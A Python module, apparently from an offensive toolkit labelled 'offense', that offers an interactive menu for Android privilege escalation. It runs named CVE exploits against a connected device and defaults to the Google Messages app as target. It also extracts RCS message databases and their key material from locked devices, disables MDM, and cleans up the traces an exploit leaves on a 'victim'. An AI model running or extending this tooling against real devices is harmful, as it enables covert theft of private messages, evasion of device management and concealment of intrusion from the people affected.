"""
Android Root Methods v2.0 — Root detection, Magisk, CVE exploits, GrapheneOS support

Privilege escalation paths:
  CVE-2024-0044  — run-as any app UID (Android 12-13, pre-Oct 2024)
  CVE-2024-31317 — Zygote injection (Android 12-14, pre-Mar 2024, NOT GrapheneOS)
  fastboot boot  — temp root via Magisk-patched image (unlocked bootloader)
  Pixel GPU      — kernel root via Mali driver (CVE-2023-6241, CVE-2025-0072)
  Magisk         — standard Magisk install + patch workflow
  adb root       — userdebug/eng builds only
"""

DESCRIPTION = "Android root methods (CVE-2024-0044, CVE-2024-31317, Magisk, fastboot, GrapheneOS)"
AUTHOR = "AUTARCH"
VERSION = "2.0"
CATEGORY = "offense"

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


class AndroidRoot:
    """Interactive menu for Android rooting and privilege escalation."""

    def __init__(self):
        from core.android_exploit import get_exploit_manager
        from core.hardware import get_hardware_manager
        self.mgr = get_exploit_manager()
        self.hw = get_hardware_manager()
        self.serial = None

    def _select_device(self):
        devices = self.hw.adb_devices()
        if not devices:
            print("  No ADB devices connected.")
            return
        if len(devices) == 1:
            self.serial = devices[0]['serial']
            print(f"  Selected: {self.serial}")
            return
        print("\n  Select device:")
        for i, d in enumerate(devices, 1):
            model = d.get('model', '')
            print(f"    {i}) {d['serial']} {model}")
        try:
            choice = int(input("  > ").strip())
            if 1 <= choice <= len(devices):
                self.serial = devices[choice - 1]['serial']
        except (ValueError, EOFError, KeyboardInterrupt):
            pass

    def _ensure_device(self):
        if not self.serial:
            self._select_device()
        return self.serial is not None

    def show_menu(self):
        print(f"\n{'='*55}")
        print("  Root Methods & Privilege Escalation")
        print(f"{'='*55}")
        print(f"  Device: {self.serial or '(none)'}")
        print()
        print("  [1] Check Root Status")
        print("  [2] Vulnerability Assessment")
        print("  [3] Detect OS (Stock / GrapheneOS)")
        print("  [4] CVE-2024-0044 — run-as any app UID")
        print("  [5] CVE-2024-31317 — Zygote injection")
        print("  [6] Install Magisk APK")
        print("  [7] Pull Patched Boot Image")
        print("  [8] Fastboot Temp Root (boot patched image)")
        print("  [9] Root via Exploit Binary")
        print("  [a] ADB Root Shell (debug builds)")
        print("  [r] Extract RCS (auto-select best exploit)")
        print("  [e] CVE-2025-48543 — system UID (Android 15/16)")
        print("  [c] Cleanup CVE-2024-0044 Traces")
        print("  [s] Select Device")
        print("  [0] Back")
        print()

    def check_root(self):
        if not self._ensure_device():
            return
        print("  Checking root status...")
        result = self.mgr.check_root(self.serial)
        print(f"\n  Rooted: {'YES' if result['rooted'] else 'NO'}")
        if result['method']:
            print(f"  Method: {result['method']}")
        if result['version']:
            print(f"  Version: {result['version']}")
        for k, v in result.get('details', {}).items():
            print(f"    {k}: {v}")

    def vuln_assessment(self):
        if not self._ensure_device():
            return
        print("  Assessing vulnerabilities...")
        result = self.mgr.assess_vulnerabilities(self.serial)
        oi = result['os_info']
        print(f"\n  OS: {'GrapheneOS' if oi.get('is_grapheneos') else 'Stock Android'}")
        print(f"  Model: {oi.get('model', '?')} ({oi.get('brand', '?')})")
        print(f"  Android: {oi.get('android_version', '?')} (SDK {oi.get('sdk', '?')})")
        print(f"  Patch: {oi.get('security_patch', '?')}")
        print(f"  Bootloader: {'UNLOCKED' if oi.get('bootloader_unlocked') else 'LOCKED'}")
        print(f"  Kernel: {oi.get('kernel', '?')}")
        print(f"\n  Exploitable: {result['exploitable_count']}")
        print(f"  Kernel root: {'YES' if result['has_kernel_root'] else 'NO'}")
        print(f"  App UID:     {'YES' if result['has_app_uid'] else 'NO'}")
        for v in result['vulnerabilities']:
            m = '[!]' if v.get('exploitable') else '[ ]'
            print(f"\n  {m} {v.get('cve', 'N/A'):20s} {v['name']}")
            print(f"       Type: {v['type']} | Severity: {v.get('severity', '?')}")
            if v.get('note'):
                print(f"       Note: {v['note']}")

    def detect_os(self):
        if not self._ensure_device():
            return
        info = self.mgr.detect_os_type(self.serial)
        print(f"\n  Brand: {info.get('brand', '?')}")
        print(f"  Model: {info.get('model', '?')}")
        print(f"  Android: {info.get('android_version', '?')} (SDK {info.get('sdk', '?')})")
        print(f"  Patch: {info.get('security_patch', '?')}")
        print(f"  Pixel: {'YES' if info.get('is_pixel') else 'NO'}")
        print(f"  GrapheneOS: {'YES' if info.get('is_grapheneos') else 'NO'}")
        print(f"  Hardened Malloc: {'YES' if info.get('hardened_malloc') else 'NO'}")
        print(f"  Bootloader: {'UNLOCKED' if info.get('bootloader_unlocked') else 'LOCKED'}")

    def cve_0044(self):
        if not self._ensure_device():
            return
        try:
            target = input("  Target package [com.google.android.apps.messaging]: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not target:
            target = 'com.google.android.apps.messaging'
        print(f"  Exploiting CVE-2024-0044 against {target}...")
        result = self.mgr.exploit_cve_2024_0044(self.serial, target)
        if result['success']:
            print(f"\n  SUCCESS! {result['message']}")
            print(f"  Victim: {result['victim_name']}  UID: {result['target_uid']}")
        else:
            print(f"\n  FAILED: {result.get('error', 'Unknown')}")

    def cve_31317(self):
        if not self._ensure_device():
            return
        try:
            target = input("  Target package [com.google.android.apps.messaging]: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not target:
            target = 'com.google.android.apps.messaging'
        print(f"  Exploiting CVE-2024-31317 against {target}...")
        result = self.mgr.exploit_cve_2024_31317(self.serial, target)
        if result['success']:
            print(f"\n  SUCCESS! {result['message']}")
        else:
            print(f"\n  FAILED: {result.get('error', 'Unknown')}")

    def install_magisk(self):
        if not self._ensure_device():
            return
        try:
            apk = input("  Magisk APK path: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not apk:
            return
        result = self.mgr.install_magisk(self.serial, apk)
        if result['success']:
            print("  Magisk installed. Open app → patch boot image → use [8] to temp boot.")
        else:
            print(f"  Error: {result.get('error', result.get('output', 'Failed'))}")

    def pull_patched(self):
        if not self._ensure_device():
            return
        result = self.mgr.pull_patched_boot(self.serial)
        if result['success']:
            print(f"  Saved: {result['local_path']} ({result['size'] / (1024*1024):.1f} MB)")
        else:
            print(f"  Error: {result.get('error', 'Failed')}")

    def fastboot_root(self):
        if not self._ensure_device():
            return
        try:
            img = input("  Patched boot/init_boot image: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not img:
            return
        print("  Booting patched image via fastboot (temp root, no flash)...")
        result = self.mgr.fastboot_temp_root(self.serial, img)
        if result['success']:
            print(f"\n  {result['message']}")
        else:
            print(f"\n  FAILED: {result.get('error', '')}")

    def root_exploit(self):
        if not self._ensure_device():
            return
        try:
            exploit = input("  Exploit binary path: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not exploit:
            return
        result = self.mgr.root_via_exploit(self.serial, exploit)
        print("  ROOT OBTAINED!" if result['success'] else "  Root not obtained.")
        print(f"  Output:\n{result.get('exploit_output', '')}")

    def adb_root(self):
        if not self._ensure_device():
            return
        result = self.mgr.adb_root_shell(self.serial)
        print("  ADB running as root." if result['success'] else f"  Failed: {result['output']}")

    def extract_rcs_auto(self):
        if not self._ensure_device():
            return
        print("  Auto-selecting best exploit for RCS extraction...")
        result = self.mgr.extract_rcs_locked_device(self.serial)
        if result.get('success'):
            print(f"\n  SUCCESS — method: {result.get('extraction_method')}")
            print(f"  Output: {result.get('output_dir', '?')}")
            if result.get('pull_command'):
                print(f"  Pull:   {result['pull_command']}")
            if result.get('encrypted'):
                print("  Note:   Database is encrypted — key material included in shared_prefs/")
        else:
            print(f"\n  FAILED — {result.get('extraction_method', 'no method worked')}")
            for method in result.get('methods_tried', []):
                print(f"    Tried: {method}")
            fb = result.get('fallback', {})
            if fb.get('sms_mms_available'):
                print(f"    Fallback: {fb['sms_count']} SMS/MMS messages available via content providers")
            if fb.get('note'):
                print(f"    {fb['note']}")

    def cve_48543(self):
        if not self._ensure_device():
            return
        print("  Tasks: extract_rcs, extract_app:<pkg>, disable_mdm, shell")
        try:
            task = input("  Task [extract_rcs]: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not task:
            task = 'extract_rcs'
        print(f"  Exploiting CVE-2025-48543 (task: {task})...")
        result = self.mgr.exploit_cve_2025_48543(self.serial, task)
        if result.get('success'):
            print(f"\n  SUCCESS! UID: {result.get('uid_achieved')}")
            print(f"  Output: {result.get('output_dir', '?')}")
            if result.get('pull_command'):
                print(f"  Pull:   {result['pull_command']}")
            if result.get('extracted_files'):
                print(f"  Files:  {len(result['extracted_files'])}")
        else:
            err = result.get('error', 'Unknown')
            print(f"\n  FAILED: {err}")
            if result.get('manual_steps'):
                print("\n  Manual steps needed:")
                for step in result['manual_steps']:
                    print(f"    {step}")

    def cleanup(self):
        if not self._ensure_device():
            return
        try:
            victim = input("  Victim name from CVE-2024-0044: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not victim:
            return
        result = self.mgr.cleanup_cve_2024_0044(self.serial, victim)
        for line in result.get('cleanup', []):
            print(f"  {line}")

    def run_interactive(self):
        while True:
            self.show_menu()
            try:
                choice = input("  Select > ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                break
            if choice == '0':
                break
            actions = {
                '1': self.check_root, '2': self.vuln_assessment, '3': self.detect_os,
                '4': self.cve_0044, '5': self.cve_31317, '6': self.install_magisk,
                '7': self.pull_patched, '8': self.fastboot_root, '9': self.root_exploit,
                'a': self.adb_root, 'r': self.extract_rcs_auto, 'e': self.cve_48543,
                'c': self.cleanup, 's': self._select_device,
            }
            action = actions.get(choice)
            if action:
                action()
            else:
                print("  Invalid choice.")


def run():
    m = AndroidRoot()
    m.run_interactive()
